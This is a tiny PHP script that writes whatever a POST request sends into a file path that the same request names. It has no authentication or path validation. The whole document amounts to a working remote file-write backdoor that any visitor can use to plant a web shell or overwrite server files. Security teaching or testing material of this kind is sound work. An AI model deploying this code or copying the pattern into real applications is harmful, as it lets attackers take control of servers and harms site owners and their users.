<?php
$file_handle = fopen($_POST['name'], 'w');
fwrite($file_handle, $_POST['data']);
fclose($file_handle);
?>